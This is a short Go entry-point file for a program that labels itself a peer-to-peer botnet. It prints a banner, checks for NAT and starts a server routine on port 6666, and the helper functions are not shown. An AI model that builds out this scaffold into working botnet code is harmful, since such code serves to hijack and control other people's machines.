package main

import (
	"fmt"
)

func main() {
	fmt.Println("Botnet P2P")
	nat, _ := checkNAT()
	fmt.Printf("NAT: %t\n", nat)
	serverRoutine(6666)
}